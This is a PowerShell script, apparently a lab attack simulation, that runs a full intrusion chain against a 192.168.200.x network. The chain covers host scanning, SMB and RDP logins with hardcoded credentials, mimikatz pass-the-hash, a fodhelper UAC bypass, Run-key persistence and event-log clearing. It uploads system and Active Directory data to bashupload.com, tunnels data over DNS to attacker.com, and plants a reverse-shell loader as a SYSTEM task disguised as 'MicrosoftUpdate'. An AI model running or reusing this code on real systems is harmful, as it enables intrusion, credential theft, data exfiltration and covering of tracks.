# ==================== Configuration ==================== 
$Subnet = "192.168.200."
$User = "skynet"
$Password = "M@ster123"
$ExfilServer = "https://bashupload.com"
$EicarURL = "http://malware.wicar.org/data/eicar.com"
$LocalEicarPath = "C:\Users\Public\eicar.com"
$DownloadPath = "C:\Users\Public\malware.exe"
$LogPath = "C:\Users\Public\attack_log.txt"

# Convert credentials for authentication
$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $SecPassword)

# ==================== Network Scanning & Enumeration ====================
Write-Output "[*] Scanning the network..."
1..254 | ForEach-Object {
    $IP = "$Subnet$_"
    if (Test-Connection -ComputerName $IP -Count 1 -Quiet -TimeoutSeconds 1) {
        Write-Output "[+] Host Alive: $IP"
        Test-NetConnection -ComputerName $IP -Port 445
        Test-NetConnection -ComputerName $IP -Port 3389
    }
}

# ARP Scanning
Write-Output "[*] ARP Scanning..."
arp -a | Out-File -Append $LogPath

# ==================== Credential Attacks ====================
Write-Output "[*] Attempting SMB Authentication..."
Invoke-Command -ScriptBlock { net use \\192.168.200.10\C$ } -Credential $Cred

Write-Output "[*] Attempting RDP Brute Force..."
Start-Process "mstsc.exe" -ArgumentList "/v:192.168.200.10" -Credential $Cred

# ==================== Malware Execution Simulation ====================
Write-Output "[*] Downloading and executing EICAR test file..."
Invoke-WebRequest -Uri $EicarURL -OutFile $LocalEicarPath
Start-Process -FilePath $LocalEicarPath

# ==================== Remote Code Execution ====================
Write-Output "[*] Executing remote PowerShell command..."
Invoke-Command -ComputerName "192.168.200.20" -Credential $Cred -ScriptBlock { Get-Process }

Write-Output "[*] WMI Execution..."
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Users\Public\whoami.txt"

# ==================== Persistence & Lateral Movement ====================
Write-Output "[*] Creating persistence via Registry Run Key..."
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PersistentBackdoor" -Value "C:\Users\Public\malware.exe" -PropertyType String

Write-Output "[*] Attempting Pass-the-Hash attack..."
Invoke-Expression "mimikatz 'sekurlsa::pth /user:$User /domain:lab /ntlm:<HASH>'"

# ==================== Exfiltration & Data Theft ====================
Write-Output "[*] Collecting and exfiltrating system info..."
Get-ComputerInfo | Out-File "C:\Users\Public\sysinfo.txt"
Invoke-Expression "curl -T C:\Users\Public\sysinfo.txt $ExfilServer"

Write-Output "[*] Exfiltrating Active Directory information..."
Get-ADUser -Filter * | Out-File "C:\Users\Public\ad_users.txt"
Invoke-Expression "curl -T C:\Users\Public\ad_users.txt $ExfilServer"

# ==================== SMB Attacks ====================
Write-Output "[*] Listing SMB shares..."
Invoke-Expression "net view \\192.168.200.10"

Write-Output "[*] Attempting anonymous SMB login..."
net use \\192.168.200.10\IPC$ /user:"" ""

# ==================== File Manipulation & Anti-Forensics ====================
Write-Output "[*] Clearing event logs..."
wevtutil cl Security
wevtutil cl System

Write-Output "[*] Hiding files..."
attrib +h C:\Users\Public\malware.exe

# ==================== DNS Tunneling & C2 Communication Simulation ====================
Write-Output "[*] Simulating DNS Exfiltration..."
$EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("stolen data"))
Invoke-Expression "nslookup $EncodedData.attacker.com"

# ==================== Privilege Escalation ====================
Write-Output "[*] Attempting UAC Bypass..."
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\Public\malware.exe" -PropertyType String
Start-Process "C:\Windows\System32\fodhelper.exe"

# ==================== Staging for Further Attacks ====================
Write-Output "[*] Writing PowerShell reverse shell payload..."
Set-Content -Path "C:\Users\Public\rev.ps1" -Value "Start-Process powershell -ArgumentList 'IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')'"

Write-Output "[*] Scheduled Task for Reverse Shell..."
schtasks /create /tn "MicrosoftUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\rev.ps1" /sc minute /mo 1 /ru System

# ==================== Final Logging & Cleanup ====================
Write-Output "[*] Attack simulation complete! Review logs at: $LogPath"
